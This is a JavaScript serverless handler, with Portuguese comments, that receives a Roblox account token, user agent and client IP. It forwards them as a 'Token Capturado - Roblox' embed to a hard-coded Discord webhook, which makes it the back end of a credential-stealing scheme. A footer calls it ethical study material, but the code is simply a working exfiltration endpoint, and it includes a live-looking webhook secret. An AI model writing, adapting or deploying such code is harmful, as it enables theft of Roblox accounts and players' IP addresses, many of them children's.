export const config = {
  runtime: "edge", // funciona no Vercel Edge, Cloudflare Workers, etc
};

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

async function sendToDiscord(payload) {
  try {
    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (!res.ok) {
      throw new Error(`Webhook response status ${res.status}`);
    }
    return true;
  } catch (error) {
    console.error("Erro enviando webhook:", error);
    return false;
  }
}

export default async function handler(req) {
  if (req.method !== "POST") {
    return new Response("Método não permitido", { status: 405 });
  }

  try {
    const data = await req.json();

    // Dados básicos que esperamos
    const token = data.token || "Não enviado";
    const userAgent = data.userAgent || "Não enviado";
    const ip = req.headers.get("x-forwarded-for") || req.headers.get("x-real-ip") || "Desconhecido";

    // Monta o embed padrão para Discord
    const embed = {
      title: "Token Capturado - Roblox",
      description: `[Clique para abrir Roblox](https://www.roblox.com/home)`,
      color: 15158332, // vermelho
      fields: [
        { name: "Token", value: `\`\`\`${token}\`\`\``, inline: false },
        { name: "User Agent", value: `\`\`\`${userAgent}\`\`\``, inline: false },
        { name: "IP do Cliente", value: `\`\`\`${ip}\`\`\``, inline: true },
        { name: "Timestamp", value: new Date().toISOString(), inline: true },
      ],
      footer: {
        text: "Atividade ética para estudo - DK",
        icon_url: "https://www.roblox.com/favicon.ico",
      },
      thumbnail: {
        url: "https://tr.rbxcdn.com/34e8bdf4c5ef77c992d68e45d4c02f86/150/150/AvatarHeadshot/Png",
      },
      timestamp: new Date().toISOString(),
    };

    const payload = { embeds: [embed] };

    const sent = await sendToDiscord(payload);
    if (!sent) return new Response("Falha ao enviar webhook", { status: 500 });

    return new Response("Webhook enviado com sucesso!", { status: 200 });
  } catch (error) {
    console.error("Erro na API:", error);
    return new Response("Erro interno no servidor", { status: 500 });
  }
}
